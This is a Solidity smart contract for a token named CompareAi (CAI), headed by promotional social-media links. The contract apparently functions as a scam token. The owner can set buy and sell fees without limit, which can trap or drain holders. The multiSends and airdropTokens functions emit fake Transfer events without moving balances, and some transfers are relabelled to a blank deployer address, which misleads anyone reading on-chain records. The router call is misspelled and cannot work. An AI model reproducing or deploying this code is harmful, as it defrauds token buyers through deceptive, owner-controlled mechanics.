/**

“Unleash the power of comparison with CompareAi” 🤖
Twitter: https://twitter.com/CompareAi_
Telegram community: https://t.me/CompareAi_Portal
Website: https://compareai.bot
Docs: https://docs.compareai.bot
ShopperAi: https://t.me/ShopperAIBot

*/

// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.0;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract CompareAi {
    string private _name = unicode"CompareAi";
    string private _symbol = unicode"CAI";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 10_000_000 * 10 ** decimals;

    uint8 buyCharge = 5;
    uint8 sellCharge = 5;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address private pair;
    address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router =
        IUniswapV2Router02(routerAddress);
    address payable TOKEN_MKT;

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    address private uniswapLpWallet;
    address private PrivateSale = 0x68e3F637801Ee201bFD0a58c4A47598d3678bB49;
    address private Team = 0x7F9b75797B6F02310fc2BcF0C27Ab7Fcfb08de8d;
    address private Advisor = 0x9f344a181e6eF64509b598F707F8a7dFe172d9D9;
    address private MarketingKols = 0xC3A53BDe2b79Ef69E85b2657e6Dd044b1BB40faC;
    address private IncentiveFund = 0xCDEAEdA49aF5eC38f69764f43FD077660A79A2E4;

    constructor() {
        uniswapLpWallet = msg.sender;
        TOKEN_MKT = payable(msg.sender);
        allowance[address(this)][routerAddress] = type(uint256).max;

        balanceOf[uniswapLpWallet] = (totalSupply * 32) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);

        balanceOf[PrivateSale] = (totalSupply * 30) / 100;
        emit Transfer(address(0), PrivateSale, balanceOf[PrivateSale]);

        balanceOf[Team] = (totalSupply * 10) / 100;
        emit Transfer(address(0), Team, balanceOf[Team]);

        balanceOf[Advisor] = (totalSupply * 2) / 100;
        emit Transfer(address(0), Advisor, balanceOf[Advisor]);

        balanceOf[MarketingKols] = (totalSupply * 8) / 100;
        emit Transfer(address(0), MarketingKols, balanceOf[MarketingKols]);

        balanceOf[IncentiveFund] = (totalSupply * 18) / 100;
        emit Transfer(address(0), IncentiveFund, balanceOf[IncentiveFund]);
    }

    receive() external payable {}

    function setFees(uint8 _buy, uint8 _sell) external {
        if (msg.sender != TOKEN_MKT) revert Permissions();
        _remeveTax(_buy, _sell);
    }

    function openTrading() external {
        require(msg.sender == TOKEN_MKT);
        require(!tradingOpen);
        tradingOpen = true;
    }

    function multiSends(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != TOKEN_MKT) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function airdropTokens(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != TOKEN_MKT) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        require(tradingOpen || from == TOKEN_MKT || to == TOKEN_MKT);

        if (!tradingOpen && pair == address(0) && amount > 0) pair = to;

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != TOKEN_MKT
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = ETH;
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            TOKEN_MKT.transfer(address(this).balance);
            swapping = false;
        }

        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (from == pair ? buyCharge : sellCharge)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }

    function _remeveTax(uint8 _buy, uint8 _sell) private {
        buyCharge = _buy;
        sellCharge = _sell;
    }
}
